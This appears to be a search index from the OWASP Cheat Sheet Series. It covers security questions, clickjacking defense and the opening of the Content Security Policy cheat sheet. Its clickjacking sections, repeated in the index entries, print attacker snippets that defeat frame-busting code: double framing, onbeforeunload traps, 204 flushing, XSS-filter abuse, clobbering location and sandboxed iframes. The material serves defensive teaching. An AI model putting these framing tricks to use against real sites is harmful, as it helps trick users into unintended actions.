MFA token.","title":"When to Use Security Questions"},{"location":"cheatsheets/Choosing_and_Using_Security_Questions_Cheat_Sheet.html#authentication-flow","text":"Security questions may be used as part of the main authentication flow to supplement passwords where MFA is not available. A typical authentication flow would be: The user enters their username and password. If the username and password are correct, the user is presented with the security question(s). If the answers are correct, the user is logged in. If the answers to the security questions are incorrect, then this should be counted as a failed login attempt, and the account lockout counter should be incremented for the user.","title":"Authentication Flow"},{"location":"cheatsheets/Choosing_and_Using_Security_Questions_Cheat_Sheet.html#forgotten-password-or-lost-mfa-token-flow","text":"Forgotten password functionality often provides a mechanism for attackers to enumerate user accounts if it is not correctly implemented. The following flow avoids this issue by only displaying the security questions once the user has proved ownership of the email address: The user enters email address (and solves a CAPTCHA). The application displays a generic message such as \"If the email address was correct, an email will be sent to it\". An email email with a randomly generated, single-use link is sent to the user. The user clicks the link. The user is presented with the security question(s). If the answer is correct, the user can enter a new password.","title":"Forgotten Password or Lost MFA Token Flow"},{"location":"cheatsheets/Choosing_and_Using_Security_Questions_Cheat_Sheet.html#how-to-use-security-questions","text":"","title":"How to Use Security Questions"},{"location":"cheatsheets/Choosing_and_Using_Security_Questions_Cheat_Sheet.html#storing-answers","text":"The answers to security questions may contain personal information about the user, and may also be re-used by the user between different applications. As such, they should be treated in the same way as passwords, and stored using a secure hashing algorithm such as Bcrypt. The password storage cheat sheet contains further guidance on this.","title":"Storing Answers"},{"location":"cheatsheets/Choosing_and_Using_Security_Questions_Cheat_Sheet.html#comparing-answers","text":"Comparing the answers provided by the user with the stored answer in a case insensitive manner makes it much easier for the user. The simplest way to do this is to convert the answer to lowercase before hashing the answer to store it, and then lowercase the user-provided answer before comparing them. It is also beneficial to give the user some indication of the format that they should use to enter answers. This could be done through input validation, or simply by recommending that the user enters their details in a specific format. For example, when asking for a date, indicating that the format should be \"DD/MM/YYYY\" will mean that the user doesn't have to try and guess what format they entered when registering.","title":"Comparing Answers"},{"location":"cheatsheets/Choosing_and_Using_Security_Questions_Cheat_Sheet.html#updating-answers","text":"When the user updates the answers to their security questions, this should be treated as a sensitive operation within the application. As such, the user should be required to re-authenticate themselves by entering their password (or ideally using MFA), in order to prevent an attacker updating the questions if they gain temporary access to the user's account.","title":"Updating Answers"},{"location":"cheatsheets/Choosing_and_Using_Security_Questions_Cheat_Sheet.html#multiple-security-questions","text":"When security questions are used, the user can either be asked a single question, or can be asked multiple questions at the same time. This provides a greater level of assurance, especially if the questions are diverse, as an attacker would need to obtain more information about the target user. A mixture of user-defined and system-defined questions can be very effective for this. If the user is asked a single question out of a bank of possible questions, then this question should not be changed until the user has answered it correctly. If the attacker is allowed to try answering all of the different security questions, this greatly increases the chance that they will be able to guess or obtain the answer to one of them.","title":"Multiple Security Questions"},{"location":"cheatsheets/Clickjacking_Defense_Cheat_Sheet.html","text":"Clickjacking Defense Cheat Sheet \u00b6 Introduction \u00b6 This cheat sheet is intended to provide guidance for developers on how to defend against Clickjacking , also known as UI redress attacks. There are three main mechanisms that can be used to defend against these attacks: Preventing the browser from loading the page in frame using the X-Frame-Options or Content Security Policy (frame-ancestors) HTTP headers. Preventing session cookies from being included when the page is loaded in a frame using the SameSite cookie attribute. Implementing JavaScript code in the page to attempt to prevent it being loaded in a frame (known as a \"frame-buster\"). Note that these mechanisms are all independent of each other, and where possible more than one of them should be implemented in order to provide defense in depth. Defending with Content Security Policy (CSP) frame-ancestors directive \u00b6 The frame-ancestors directive can be used in a Content-Security-Policy HTTP response header to indicate whether or not a browser should be allowed to render a page in a <frame> or <iframe> . Sites can use this to avoid Clickjacking attacks by ensuring that their content is not embedded into other sites. frame-ancestors allows a site to authorize multiple domains using the normal Content Security Policy semantics. Content-Security-Policy: frame-ancestors Examples \u00b6 Common uses of CSP frame-ancestors: Content-Security-Policy: frame-ancestors 'none'; This prevents any domain from framing the content. This setting is recommended unless a specific need has been identified for framing. Content-Security-Policy: frame-ancestors 'self'; This only allows the current site to frame the content. Content-Security-Policy: frame-ancestors 'self' *.somesite.com https://myfriend.site.com; This allows the current site, as well as any page on somesite.com (using any protocol), and only the page myfriend.site.com , using HTTPS only on the default port (443). Note that the single quotes are required around self and none , but may not occur around other source expressions. See the following documentation for further details and more complex examples: https://w3c.github.io/webappsec-csp/#directive-frame-ancestors https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors Limitations \u00b6 Browser support: CSP frame-ancestors is not supported by all the major browsers yet. X-Frame-Options takes priority: Section \"Relation to X-Frame-Options\" of the CSP Spec says: \" If a resource is delivered with an policy that includes a directive named frame-ancestors and whose disposition is \"enforce\", then the X-Frame-Options header MUST be ignored \", but Chrome 40 & Firefox 35 ignore the frame-ancestors directive and follow the X-Frame-Options header instead. Defending with X-Frame-Options Response Headers \u00b6 The X-Frame-Options HTTP response header can be used to indicate whether or not a browser should be allowed to render a page in a <frame> or <iframe> . Sites can use this to avoid Clickjacking attacks, by ensuring that their content is not embedded into other sites. Set the X-Frame-Options header for all responses containing HTML content. The possible values are \"DENY\", \"SAMEORIGIN\", or \"ALLOW-FROM uri\" X-Frame-Options Header Types \u00b6 There are three possible values for the X-Frame-Options header: DENY , which prevents any domain from framing the content. The \"DENY\" setting is recommended unless a specific need has been identified for framing. SAMEORIGIN , which only allows the current site to frame the content. ALLOW-FROM uri , which permits the specified 'uri' to frame this page. (e.g., ALLOW-FROM http://www.example.com ). Check limitations below because this will fail open if the browser does not support it. Other browsers support the new CSP frame-ancestors directive instead. A few support both. Browser Support \u00b6 The following browsers support X-Frame-Options headers. References: Mozilla Developer Network IETF Draft X-Frame-Options Compatibility Test - Check this for the LATEST browser support info for the X-Frame-Options header Implementation \u00b6 To implement this protection, you need to add the X-Frame-Options HTTP Response header to any page that you want to protect from being clickjacked via framebusting. One way to do this is to add the HTTP Response Header manually to every page. A possibly simpler way is to implement a filter that automatically adds the header to every page or to add it at Web Application Firewall of Web/Application Server level. Common Defense Mistakes \u00b6 Meta-tags that attempt to apply the X-Frame-Options directive DO NOT WORK. For example, <meta http-equiv=\"X-Frame-Options\" content=\"deny\"> will not work. You must apply the X-FRAME-OPTIONS directive as HTTP Response Header as described above. Limitations \u00b6 Per-page policy specification : The policy needs to be specified for every page, which can complicate deployment. Providing the ability to enforce it for the entire site, at login time for instance, could simplify adoption. Problems with multi-domain sites : The current implementation does not allow the webmaster to provide a whitelist of domains that are allowed to frame the page. While whitelisting can be dangerous, in some cases a webmaster might have no choice but to use more than one hostname. ALLOW-FROM browser support : The ALLOW-FROM option is a relatively recent addition (circa 2012) and may not be supported by all browsers yet. BE CAREFUL ABOUT DEPENDING ON ALLOW-FROM. If you apply it and the browser does not support it, then you will have NO clickjacking defense in place. Multiple options not supported : There is no way to allow the current site and a third-party site to frame the same response. Browsers only honour one X-Frame-Options header and only one value on that header. Nested Frames don't work with SAMEORIGIN and ALLOW-FROM : In the following situation, the http://framed.invalid/child frame does not load because ALLOW-FROM applies to the top-level browsing context, not that of the immediate parent. The solution is to use ALLOW-FROM in both the parent and child frames (but this prevents the child frame loading if the //framed.invalid/parent page is loaded as the top level document). X-Frame-Options Deprecated While the X-Frame-Options header is supported by the major browsers, it was never standardized and has been deprecated in favour of the frame-ancestors directive from the CSP Level 2 specification. Proxies Web proxies are notorious for adding and stripping headers. If a web proxy strips the X-Frame-Options header then the site loses its framing protection. Defending with SameSite Cookies \u00b6 The SameSite cookie attribute defined in RFC 6265bis is primarily intended to defend against cross-site request forgery (CSRF) ; however it can also provide protection against Clickjacking attacks. Cookies with a SameSite attribute of either strict or lax will not be included in requests made to a page within an <iframe> . This means that if the session cookies are marked as SameSite , any Clickjacking attack that requires the victim to be authenticated will not work, as the cookie will not be sent. An article on the Netsparker blog provides further details on which types of requests cookies are sent for with the different SameSite policies. This approach is discussed on the JavaScript.info website . Limitations \u00b6 If the Clickjacking attack does not require the user to be authenticated, this attribute will not provide any protection. Additionally, while SameSite attribute is supported by most modern browsers , there are still some users (approximately 6% as of November 2020) with browsers that do not support it. The use of this attribute should be considered as part of a defence-in-depth approach, and it should not be relied upon as the sole protective measure against Clickjacking. Best-for-now Legacy Browser Frame Breaking Script \u00b6 One way to defend against clickjacking is to include a \"frame-breaker\" script in each page that should not be framed. The following methodology will prevent a webpage from being framed even in legacy browsers, that do not support the X-Frame-Options-Header. In the document HEAD element, add the following: First apply an ID to the style element itself: < style id = \"antiClickjack\" > body { display : none !important ;} </ style > Then, delete that style by its ID immediately after in the script: < script type = \"text/javascript\" > if ( self === top ) { var antiClickjack = document . getElementById ( \"antiClickjack\" ); antiClickjack . parentNode . removeChild ( antiClickjack ); } else { top . location = self . location ; } </ script > This way, everything can be in the document HEAD and you only need one method/taglib in your API. window.confirm() Protection \u00b6 The use of X-Frame-Options or a frame-breaking script is a more fail-safe method of clickjacking protection. However, in scenarios where content must be frameable, then a window.confirm() can be used to help mitigate Clickjacking by informing the user of the action they are about to perform. Invoking window.confirm() will display a popup that cannot be framed. If the window.confirm() originates from within an iframe with a different domain than the parent, then the dialog box will display what domain the window.confirm() originated from. In this scenario the browser is displaying the origin of the dialog box to help mitigate Clickjacking attacks. It should be noted that Internet Explorer is the only known browser that does not display the domain that the window.confirm() dialog box originated from, to address this issue with Internet Explorer insure that the message within the dialog box contains contextual information about the type of action being performed. For example: < script type = \"text/javascript\" > var action_confirm = window . confirm ( \"Are you sure you want to delete your youtube account?\" ) if ( action_confirm ) { //... Perform action } else { //... The user does not want to perform the requested action.` } </ script > Insecure Non-Working Scripts DO NOT USE \u00b6 Consider the following snippet which is NOT recommended for defending against clickjacking: < script > if ( top != self ) top . location . href = self . location . href </ script > This simple frame breaking script attempts to prevent the page from being incorporated into a frame or iframe by forcing the parent window to load the current frame's URL. Unfortunately, multiple ways of defeating this type of script have been made public. We outline some here. Double Framing \u00b6 Some frame busting techniques navigate to the correct page by assigning a value to parent.location . This works well if the victim page is framed by a single page. However, if the attacker encloses the victim in one frame inside another (a double frame), then accessing parent.location becomes a security violation in all popular browsers, due to the descendant frame navigation policy . This security violation disables the counter-action navigation. Victim frame busting code: if ( top . location != self . location ) { parent . location = self . location ; } Attacker top frame: < iframe src = \"attacker2.html\" > Attacker sub-frame: < iframe src = \"http://www.victim.com\" > The onBeforeUnload Event \u00b6 A user can manually cancel any navigation request submitted by a framed page. To exploit this, the framing page registers an onBeforeUnload handler which is called whenever the framing page is about to be unloaded due to navigation. The handler function returns a string that becomes part of a prompt displayed to the user. Say the attacker wants to frame PayPal. He registers an unload handler function that returns the string \"Do you want to exit PayPal?\". When this string is displayed to the user is likely to cancel the navigation, defeating PayPal's frame busting attempt. The attacker mounts this attack by registering an unload event on the top page using the following code: < script > window . onbeforeunload = function (){ return \"Asking the user nicely\" ; } </ script > < iframe src = \"http://www.paypal.com\" > PayPal's frame busting code will generate a BeforeUnload event activating our function and prompting the user to cancel the navigation event. No-Content Flushing \u00b6 While the previous attack requires user interaction, the same attack can be done without prompting the user. Most browsers (IE7, IE8, Google Chrome, and Firefox) enable an attacker to automatically cancel the incoming navigation request in an onBeforeUnload event handler by repeatedly submitting a navigation request to a site responding with \" 204 - No Content \". Navigating to a No Content site is effectively a NOP, but flushes the request pipeline, thus canceling the original navigation request. Here is sample code to do this: var preventbust = 0 window . onbeforeunload = function () { killbust ++ } setInterval ( function () { if ( killbust > 0 ){ killbust = 2 ; window . top . location = 'http://nocontent204.com' } }, 1 ); < iframe src = \"http://www.victim.com\" > Exploiting XSS filters \u00b6 IE8 and Google Chrome introduced reflective XSS filters that help protect web pages from certain types of XSS attacks. Nava and Lindsay (at Blackhat) observed that these filters can be used to circumvent frame busting code. The IE8 XSS filter compares given request parameters to a set of regular expressions in order to look for obvious attempts at cross-site scripting. Using \"induced false positives\", the filter can be used to disable selected scripts. By matching the beginning of any script tag in the request parameters, the XSS filter will disable all inline scripts within the page, including frame busting scripts. External scripts can also be targeted by matching an external include, effectively disabling all external scripts. Since subsets of the JavaScript loaded is still functional (inline or external) and cookies are still available, this attack is effective for clickjacking. Victim frame busting code: < script > if ( top != self ) { top . location = self . location ; } </ script > Attacker: < iframe src = \"http://www.victim.com/?v=<script > if''> The XSS filter will match that parameter <script>if to the beginning of the frame busting script on the victim and will consequently disable all inline scripts in the victim's page, including the frame busting script. The XSSAuditor filter available for Google Chrome enables the same exploit. Clobbering top.location \u00b6 Several modern browsers treat the location variable as a special immutable attribute across all contexts. However, this is not the case in IE7 and Safari 4.0.4 where the location variable can be redefined. IE7 : Once the framing page redefines location, any frame busting code in a subframe that tries to read top.location will commit a security violation by trying to read a local variable in another domain. Similarly, any attempt to navigate by assigning top.location will fail. Victim frame busting code: if ( top . location != self . location ) { top . location = self . location ; } Attacker: < script > var location = \"clobbered\" ;</ script > < iframe src = \"http://www.victim.com\" ></ iframe > Safari 4.0.4: We observed that although location is kept immutable in most circumstances, when a custom location setter is defined via defineSetter (through window) the object location becomes undefined. The framing page simply does: < script > window . defineSetter ( \"location\" , function (){}); </ script > Now any attempt to read or navigate the top frame's location will fail. Restricted zones \u00b6 Most frame busting relies on JavaScript in the framed page to detect framing and bust itself out. If JavaScript is disabled in the context of the subframe, the frame busting code will not run. There are unfortunately several ways of restricting JavaScript in a subframe: In IE 8: < iframe src = \"http://www.victim.com\" security = \"restricted\" ></ iframe > In Chrome: < iframe src = \"http://www.victim.com\" sandbox ></ iframe > Firefox and IE: Activate designMode in parent page. document . designMode = \"on\" ;","title":"Clickjacking Defense"},{"location":"cheatsheets/Clickjacking_Defense_Cheat_Sheet.html#clickjacking-defense-cheat-sheet","text":"","title":"Clickjacking Defense Cheat Sheet"},{"location":"cheatsheets/Clickjacking_Defense_Cheat_Sheet.html#introduction","text":"This cheat sheet is intended to provide guidance for developers on how to defend against Clickjacking , also known as UI redress attacks. There are three main mechanisms that can be used to defend against these attacks: Preventing the browser from loading the page in frame using the X-Frame-Options or Content Security Policy (frame-ancestors) HTTP headers. Preventing session cookies from being included when the page is loaded in a frame using the SameSite cookie attribute. Implementing JavaScript code in the page to attempt to prevent it being loaded in a frame (known as a \"frame-buster\"). Note that these mechanisms are all independent of each other, and where possible more than one of them should be implemented in order to provide defense in depth.","title":"Introduction"},{"location":"cheatsheets/Clickjacking_Defense_Cheat_Sheet.html#defending-with-content-security-policy-csp-frame-ancestors-directive","text":"The frame-ancestors directive can be used in a Content-Security-Policy HTTP response header to indicate whether or not a browser should be allowed to render a page in a <frame> or <iframe> . Sites can use this to avoid Clickjacking attacks by ensuring that their content is not embedded into other sites. frame-ancestors allows a site to authorize multiple domains using the normal Content Security Policy semantics.","title":"Defending with Content Security Policy (CSP) frame-ancestors directive"},{"location":"cheatsheets/Clickjacking_Defense_Cheat_Sheet.html#content-security-policy-frame-ancestors-examples","text":"Common uses of CSP frame-ancestors: Content-Security-Policy: frame-ancestors 'none'; This prevents any domain from framing the content. This setting is recommended unless a specific need has been identified for framing. Content-Security-Policy: frame-ancestors 'self'; This only allows the current site to frame the content. Content-Security-Policy: frame-ancestors 'self' *.somesite.com https://myfriend.site.com; This allows the current site, as well as any page on somesite.com (using any protocol), and only the page myfriend.site.com , using HTTPS only on the default port (443). Note that the single quotes are required around self and none , but may not occur around other source expressions. See the following documentation for further details and more complex examples: https://w3c.github.io/webappsec-csp/#directive-frame-ancestors https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors","title":"Content-Security-Policy: frame-ancestors Examples"},{"location":"cheatsheets/Clickjacking_Defense_Cheat_Sheet.html#limitations","text":"Browser support: CSP frame-ancestors is not supported by all the major browsers yet. X-Frame-Options takes priority: Section \"Relation to X-Frame-Options\" of the CSP Spec says: \" If a resource is delivered with an policy that includes a directive named frame-ancestors and whose disposition is \"enforce\", then the X-Frame-Options header MUST be ignored \", but Chrome 40 & Firefox 35 ignore the frame-ancestors directive and follow the X-Frame-Options header instead.","title":"Limitations"},{"location":"cheatsheets/Clickjacking_Defense_Cheat_Sheet.html#defending-with-x-frame-options-response-headers","text":"The X-Frame-Options HTTP response header can be used to indicate whether or not a browser should be allowed to render a page in a <frame> or <iframe> . Sites can use this to avoid Clickjacking attacks, by ensuring that their content is not embedded into other sites. Set the X-Frame-Options header for all responses containing HTML content. The possible values are \"DENY\", \"SAMEORIGIN\", or \"ALLOW-FROM uri\"","title":"Defending with X-Frame-Options Response Headers"},{"location":"cheatsheets/Clickjacking_Defense_Cheat_Sheet.html#x-frame-options-header-types","text":"There are three possible values for the X-Frame-Options header: DENY , which prevents any domain from framing the content. The \"DENY\" setting is recommended unless a specific need has been identified for framing. SAMEORIGIN , which only allows the current site to frame the content. ALLOW-FROM uri , which permits the specified 'uri' to frame this page. (e.g., ALLOW-FROM http://www.example.com ). Check limitations below because this will fail open if the browser does not support it. Other browsers support the new CSP frame-ancestors directive instead. A few support both.","title":"X-Frame-Options Header Types"},{"location":"cheatsheets/Clickjacking_Defense_Cheat_Sheet.html#browser-support","text":"The following browsers support X-Frame-Options headers. References: Mozilla Developer Network IETF Draft X-Frame-Options Compatibility Test - Check this for the LATEST browser support info for the X-Frame-Options header","title":"Browser Support"},{"location":"cheatsheets/Clickjacking_Defense_Cheat_Sheet.html#implementation","text":"To implement this protection, you need to add the X-Frame-Options HTTP Response header to any page that you want to protect from being clickjacked via framebusting. One way to do this is to add the HTTP Response Header manually to every page. A possibly simpler way is to implement a filter that automatically adds the header to every page or to add it at Web Application Firewall of Web/Application Server level.","title":"Implementation"},{"location":"cheatsheets/Clickjacking_Defense_Cheat_Sheet.html#common-defense-mistakes","text":"Meta-tags that attempt to apply the X-Frame-Options directive DO NOT WORK. For example, <meta http-equiv=\"X-Frame-Options\" content=\"deny\"> will not work. You must apply the X-FRAME-OPTIONS directive as HTTP Response Header as described above.","title":"Common Defense Mistakes"},{"location":"cheatsheets/Clickjacking_Defense_Cheat_Sheet.html#limitations_1","text":"Per-page policy specification : The policy needs to be specified for every page, which can complicate deployment. Providing the ability to enforce it for the entire site, at login time for instance, could simplify adoption. Problems with multi-domain sites : The current implementation does not allow the webmaster to provide a whitelist of domains that are allowed to frame the page. While whitelisting can be dangerous, in some cases a webmaster might have no choice but to use more than one hostname. ALLOW-FROM browser support : The ALLOW-FROM option is a relatively recent addition (circa 2012) and may not be supported by all browsers yet. BE CAREFUL ABOUT DEPENDING ON ALLOW-FROM. If you apply it and the browser does not support it, then you will have NO clickjacking defense in place. Multiple options not supported : There is no way to allow the current site and a third-party site to frame the same response. Browsers only honour one X-Frame-Options header and only one value on that header. Nested Frames don't work with SAMEORIGIN and ALLOW-FROM : In the following situation, the http://framed.invalid/child frame does not load because ALLOW-FROM applies to the top-level browsing context, not that of the immediate parent. The solution is to use ALLOW-FROM in both the parent and child frames (but this prevents the child frame loading if the //framed.invalid/parent page is loaded as the top level document). X-Frame-Options Deprecated While the X-Frame-Options header is supported by the major browsers, it was never standardized and has been deprecated in favour of the frame-ancestors directive from the CSP Level 2 specification. Proxies Web proxies are notorious for adding and stripping headers. If a web proxy strips the X-Frame-Options header then the site loses its framing protection.","title":"Limitations"},{"location":"cheatsheets/Clickjacking_Defense_Cheat_Sheet.html#defending-with-samesite-cookies","text":"The SameSite cookie attribute defined in RFC 6265bis is primarily intended to defend against cross-site request forgery (CSRF) ; however it can also provide protection against Clickjacking attacks. Cookies with a SameSite attribute of either strict or lax will not be included in requests made to a page within an <iframe> . This means that if the session cookies are marked as SameSite , any Clickjacking attack that requires the victim to be authenticated will not work, as the cookie will not be sent. An article on the Netsparker blog provides further details on which types of requests cookies are sent for with the different SameSite policies. This approach is discussed on the JavaScript.info website .","title":"Defending with SameSite Cookies"},{"location":"cheatsheets/Clickjacking_Defense_Cheat_Sheet.html#limitations_2","text":"If the Clickjacking attack does not require the user to be authenticated, this attribute will not provide any protection. Additionally, while SameSite attribute is supported by most modern browsers , there are still some users (approximately 6% as of November 2020) with browsers that do not support it. The use of this attribute should be considered as part of a defence-in-depth approach, and it should not be relied upon as the sole protective measure against Clickjacking.","title":"Limitations"},{"location":"cheatsheets/Clickjacking_Defense_Cheat_Sheet.html#best-for-now-legacy-browser-frame-breaking-script","text":"One way to defend against clickjacking is to include a \"frame-breaker\" script in each page that should not be framed. The following methodology will prevent a webpage from being framed even in legacy browsers, that do not support the X-Frame-Options-Header. In the document HEAD element, add the following: First apply an ID to the style element itself: < style id = \"antiClickjack\" > body { display : none !important ;} </ style > Then, delete that style by its ID immediately after in the script: < script type = \"text/javascript\" > if ( self === top ) { var antiClickjack = document . getElementById ( \"antiClickjack\" ); antiClickjack . parentNode . removeChild ( antiClickjack ); } else { top . location = self . location ; } </ script > This way, everything can be in the document HEAD and you only need one method/taglib in your API.","title":"Best-for-now Legacy Browser Frame Breaking Script"},{"location":"cheatsheets/Clickjacking_Defense_Cheat_Sheet.html#windowconfirm-protection","text":"The use of X-Frame-Options or a frame-breaking script is a more fail-safe method of clickjacking protection. However, in scenarios where content must be frameable, then a window.confirm() can be used to help mitigate Clickjacking by informing the user of the action they are about to perform. Invoking window.confirm() will display a popup that cannot be framed. If the window.confirm() originates from within an iframe with a different domain than the parent, then the dialog box will display what domain the window.confirm() originated from. In this scenario the browser is displaying the origin of the dialog box to help mitigate Clickjacking attacks. It should be noted that Internet Explorer is the only known browser that does not display the domain that the window.confirm() dialog box originated from, to address this issue with Internet Explorer insure that the message within the dialog box contains contextual information about the type of action being performed. For example: < script type = \"text/javascript\" > var action_confirm = window . confirm ( \"Are you sure you want to delete your youtube account?\" ) if ( action_confirm ) { //... Perform action } else { //... The user does not want to perform the requested action.` } </ script >","title":"window.confirm() Protection"},{"location":"cheatsheets/Clickjacking_Defense_Cheat_Sheet.html#insecure-non-working-scripts-do-not-use","text":"Consider the following snippet which is NOT recommended for defending against clickjacking: < script > if ( top != self ) top . location . href = self . location . href </ script > This simple frame breaking script attempts to prevent the page from being incorporated into a frame or iframe by forcing the parent window to load the current frame's URL. Unfortunately, multiple ways of defeating this type of script have been made public. We outline some here.","title":"Insecure Non-Working Scripts DO NOT USE"},{"location":"cheatsheets/Clickjacking_Defense_Cheat_Sheet.html#double-framing","text":"Some frame busting techniques navigate to the correct page by assigning a value to parent.location . This works well if the victim page is framed by a single page. However, if the attacker encloses the victim in one frame inside another (a double frame), then accessing parent.location becomes a security violation in all popular browsers, due to the descendant frame navigation policy . This security violation disables the counter-action navigation. Victim frame busting code: if ( top . location != self . location ) { parent . location = self . location ; } Attacker top frame: < iframe src = \"attacker2.html\" > Attacker sub-frame: < iframe src = \"http://www.victim.com\" >","title":"Double Framing"},{"location":"cheatsheets/Clickjacking_Defense_Cheat_Sheet.html#the-onbeforeunload-event","text":"A user can manually cancel any navigation request submitted by a framed page. To exploit this, the framing page registers an onBeforeUnload handler which is called whenever the framing page is about to be unloaded due to navigation. The handler function returns a string that becomes part of a prompt displayed to the user. Say the attacker wants to frame PayPal. He registers an unload handler function that returns the string \"Do you want to exit PayPal?\". When this string is displayed to the user is likely to cancel the navigation, defeating PayPal's frame busting attempt. The attacker mounts this attack by registering an unload event on the top page using the following code: < script > window . onbeforeunload = function (){ return \"Asking the user nicely\" ; } </ script > < iframe src = \"http://www.paypal.com\" > PayPal's frame busting code will generate a BeforeUnload event activating our function and prompting the user to cancel the navigation event.","title":"The onBeforeUnload Event"},{"location":"cheatsheets/Clickjacking_Defense_Cheat_Sheet.html#no-content-flushing","text":"While the previous attack requires user interaction, the same attack can be done without prompting the user. Most browsers (IE7, IE8, Google Chrome, and Firefox) enable an attacker to automatically cancel the incoming navigation request in an onBeforeUnload event handler by repeatedly submitting a navigation request to a site responding with \" 204 - No Content \". Navigating to a No Content site is effectively a NOP, but flushes the request pipeline, thus canceling the original navigation request. Here is sample code to do this: var preventbust = 0 window . onbeforeunload = function () { killbust ++ } setInterval ( function () { if ( killbust > 0 ){ killbust = 2 ; window . top . location = 'http://nocontent204.com' } }, 1 ); < iframe src = \"http://www.victim.com\" >","title":"No-Content Flushing"},{"location":"cheatsheets/Clickjacking_Defense_Cheat_Sheet.html#exploiting-xss-filters","text":"IE8 and Google Chrome introduced reflective XSS filters that help protect web pages from certain types of XSS attacks. Nava and Lindsay (at Blackhat) observed that these filters can be used to circumvent frame busting code. The IE8 XSS filter compares given request parameters to a set of regular expressions in order to look for obvious attempts at cross-site scripting. Using \"induced false positives\", the filter can be used to disable selected scripts. By matching the beginning of any script tag in the request parameters, the XSS filter will disable all inline scripts within the page, including frame busting scripts. External scripts can also be targeted by matching an external include, effectively disabling all external scripts. Since subsets of the JavaScript loaded is still functional (inline or external) and cookies are still available, this attack is effective for clickjacking. Victim frame busting code: < script > if ( top != self ) { top . location = self . location ; } </ script > Attacker: < iframe src = \"http://www.victim.com/?v=<script > if''> The XSS filter will match that parameter <script>if to the beginning of the frame busting script on the victim and will consequently disable all inline scripts in the victim's page, including the frame busting script. The XSSAuditor filter available for Google Chrome enables the same exploit.","title":"Exploiting XSS filters"},{"location":"cheatsheets/Clickjacking_Defense_Cheat_Sheet.html#clobbering-toplocation","text":"Several modern browsers treat the location variable as a special immutable attribute across all contexts. However, this is not the case in IE7 and Safari 4.0.4 where the location variable can be redefined. IE7 : Once the framing page redefines location, any frame busting code in a subframe that tries to read top.location will commit a security violation by trying to read a local variable in another domain. Similarly, any attempt to navigate by assigning top.location will fail. Victim frame busting code: if ( top . location != self . location ) { top . location = self . location ; } Attacker: < script > var location = \"clobbered\" ;</ script > < iframe src = \"http://www.victim.com\" ></ iframe > Safari 4.0.4: We observed that although location is kept immutable in most circumstances, when a custom location setter is defined via defineSetter (through window) the object location becomes undefined. The framing page simply does: < script > window . defineSetter ( \"location\" , function (){}); </ script > Now any attempt to read or navigate the top frame's location will fail.","title":"Clobbering top.location"},{"location":"cheatsheets/Clickjacking_Defense_Cheat_Sheet.html#restricted-zones","text":"Most frame busting relies on JavaScript in the framed page to detect framing and bust itself out. If JavaScript is disabled in the context of the subframe, the frame busting code will not run. There are unfortunately several ways of restricting JavaScript in a subframe: In IE 8: < iframe src = \"http://www.victim.com\" security = \"restricted\" ></ iframe > In Chrome: < iframe src = \"http://www.victim.com\" sandbox ></ iframe > Firefox and IE: Activate designMode in parent page. document . designMode = \"on\" ;","title":"Restricted zones"},{"location":"cheatsheets/Content_Security_Policy_Cheat_Sheet.html","text":"Content Security Policy Cheat Sheet \u00b6 Introduction \u00b6 This article brings forth a way to integrate the defense in depth concept to the client-side of web applications. By injecting the Content-Security-Policy (CSP) headers from the server, the browser is aware and capable of protecting the user from dynamic calls that will load content into the page currently being visited. Context \u00b6 The increase in XSS and clickjacking vulnerabilities demands a more defense in depth security approach. CSP comes in place to enforce the loading of resources (scripts, images, etc.) from restricted locations that are trusted by the server, as well as enforcing HTTPS usage transparently. Moreover, the developer will get more visibility on the attacks occurring on the application by using the CSP reporting directive. Defense in Depth \u00b6 A strong CSP provides an effective second layer of protection against various types of vulnerabilities, including XSS. Although it may not be possible to fully mitigate these issues, a CSP can make it significantly harder for an attacker to actually exploit them. Even on a fully static website, which does not accept any user input, a CSP can be used to enforce the use of Subresource Integrity (SRI) . This can help prevent malicious code being loaded on the website if one of the third party sites hosting JavaScript files (such as analytics scripts) is compromised. However, CSP should not be relied upon as the only defensive mechanism on a website. It is still vital that other protective controls are implemented, such as those discussed in the Cross-Site Scripting Prevention Cheat Sheet . Policy Delivery \u00b6 CSP can be delivered to the user agent in different techniques. Content-Security-Policy HTTP response header field. This is the most preferred technique. <meta> HTML element with http-equiv attribute set to Content-Security-Policy . These elements need to be placed as early as possible in the documents. Content-Security-Policy-Report-Only HTTP response header field. This header is used when the developer is unsure of the CSP behavior and wants to monitor it, instead of enforcing it. HTTP Headers \u00b6 The following are headers for CSP. Content-Security-Policy : W3C Spec standard header. Supported by Firefox 23+, Chrome 25+ and Opera 19+ Content-Security-Policy-Report-Only : W3C Spec standard header. Supported by Firefox 23+, Chrome 25+ and Opera 19+, whereby the policy is non-blocking (\"fail open\") and a report is sent to the URL designated by the report-uri directive. This is often used as a precursor to utilizing CSP in blocking mode (\"fail closed\") DO NOT use X-Content-Security-Policy or X-WebKit-CSP. Their implementations are obsolete (since Firefox 23, Chrome 25), limited, inconsistent, and incredibly buggy. CSP Directives \u00b6 Multiple types of directives exist that allow the developer to granularly control the flow of the policies. Fetch Directives \u00b6 Fetch directives tell the browser the locations to trust and load resources from. Most fetch directives have a certain fallback list specified in w3 . This list allows for granular control of the source of scripts, images, files, etc. child-src allows the developer to control nested browsing contexts and worker execution contexts. According to MDN , the below 2 directives should be used to regulate nested browsing context and workers as child-src will be deprecated in the coming versions. frame-src specifies the URLs which can be loaded into nested browsing contexts ( e.g. <iframe> ). worker-src specifies the URLs which can be loaded as worker, sharedworker, or serviceworker. Fallback's on script-src too. connect-src provides control over fetch requests, XHR, eventsource, beacon and websockets connections. font-src specifies which URLs to load fonts from. img-src specifies the URLs that images can be loaded from. manifest-src specifies the URLs that application manifests may be loaded from. media-src specifies the URLs from which video, audio and text track resources can be loaded from. prefetch-src specifies the URLs from which resources can be prefetched from. object-src specifies the URLs from which plugins can be loaded from. script-src specifies the locations from which a script can be executed from. It is a fallback directive for other script-like directives. script-src-elem controls the location from which execution of script requests and blocks can occur. script-src-attr controls the execution of event handlers. style-src controls from where styles get applied to a document. This includes <link> elements, @import rules, and requests originating from a Link HTTP response header field. style-src-elem controls styles except for inline attributes. style-src-attr controls styles attributes. default-src is a fallback directive for the other fetch directives. Directives that are specified have no inheritance, yet directives that are not specified will fall back to the value of default-src . Document Directives \u00b6 Document directives instruct the browser about the properties of the document to which the policies will apply to. base-uri specifies the possible URLs that the <base> element can use. plugin-types limits the types of resources that can be loaded into the document ( e.g. application/pdf). 3 rules apply to the affected elements, <embed> and <object> : The element needs to explicitly declare its type. The element's type needs to match the declared 